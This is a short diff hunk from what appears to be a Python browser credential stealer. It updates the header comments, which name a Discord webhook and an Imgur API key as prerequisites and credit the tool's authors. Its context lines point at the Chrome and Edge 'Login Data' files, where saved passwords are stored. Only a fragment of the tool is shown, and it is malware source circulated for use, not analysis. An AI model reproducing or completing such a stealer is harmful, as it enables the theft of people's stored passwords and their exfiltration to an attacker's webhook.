@@ -23,14 +23,7 @@ import os
 from sys import argv
 import ctypes
 
-# prerequisites => discord webhook, imgur api key
-# lines to edit => 164, 166, 178  | replace: "placeholder"
-# author => lust, l-ust on github | https://www.github.com/l-ust
-# small update rework by 2qk , 2qk on github
-# being updated daily by war , last update by 2/28/21 at 3:57 PM
-# This is being updated and forked daily due to browser compability and etc
-# besure to keep at latest version for best performance
-# discontinued by war , lust and 2qk
+# last version , 3/18/21 by msr#6536
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
 EBP = r'Microsoft\Edge\User Data\Default\Login Data'
